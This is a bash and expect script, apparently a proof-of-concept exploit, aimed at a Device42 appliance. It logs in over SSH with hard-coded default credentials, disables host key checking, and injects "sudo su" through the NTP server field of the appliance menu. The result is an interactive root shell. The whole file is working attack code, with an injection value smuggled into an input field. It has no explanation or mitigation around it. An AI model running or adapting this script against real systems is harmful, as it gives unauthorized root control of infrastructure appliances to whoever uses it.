#!/bin/bash
# Authors
#  - Mike Mason @mikemrm
#  - Caleb Watt @calebwatt15

print_help(){
	echo >&2 "Usage: $0 host [-u username] [-p [password]] [-P port]"
}

[ "$#" -eq 0 ] && { print_help; exit 1; }

host="$1"
shift
user='device42'
password='adm!nd42'
port=404
[ "$#" -gt 0 ] && {
	while (( "$#" )); do
		case "$1" in
			'-u' )
				shift
				user="$1";
				[ -z "$user" ] && { echo >&2 "Invalid Username"; print_help; exit 1; }
				shift
			;;
			'-p' )
				shift
				password="$1"
				[ -n "$password" ] && shift
				trycount=0
				while [ -z "$password" ] && [ $trycount -lt 5 ]; do
					echo -n 'Password: '
					read -s password
					$(( trycount++ ))
				done
				[ -z "$password" ] && { echo >&2 "Invalid Password"; print_help; exit 1; }
			;;
			'-P' )
				shift
				port="$1"
				[ -z "$port" ] && { echo >&2 "Invalid Port"; print_help; exit 1; }
				shift
			;;
			* )
				echo >&2 "Invalid Argument: $1"; exit 1
			;;
		esac
	done
}

ESCRIPT=`mktemp runner.XXXXXXXXXX` || exit 1

cat >$ESCRIPT << SCRIPT
	set timeout -1
	spawn ssh -oStrictHostKeyChecking=no -oCheckHostIP=no $user@$host -p $port
	expect {
		-re ".*password:" {
			send "$password\n"
		}
		-re ".*Connection refused" {
			exit
		}
		-re ".*Connection timed out" {
			exit
		}
	}
	expect {
		"Select Your Option: " {
			send "6\n"
		}
		"Permission denied, please try again." {
			puts "\n\nInvalid Password\n"
			exit
		}
	}
	expect {
		-re ".*NTP server:.*" {
			send "asdf';\\\\ sudo\\\\ su;\\\\ echo\\\\ 'asdf\n"
			expect -re "Add NTP.*"
			send "y\n"
		}
		"Select Your Option:" {
			send "1\n"
			expect "Enter IP or FQDN of new NTP server:"
			send "asdf';\\\\ sudo\\\\ su;\\\\ echo\\\\ 'asdf\n"
			expect -re "Add NTP.*"
			send "y\n"
		}
	}
	expect -re ".*#.*"
	send "clear\n"
	interact
SCRIPT

expect $ESCRIPT
echo 'Clearing temp file...'
rm $ESCRIPT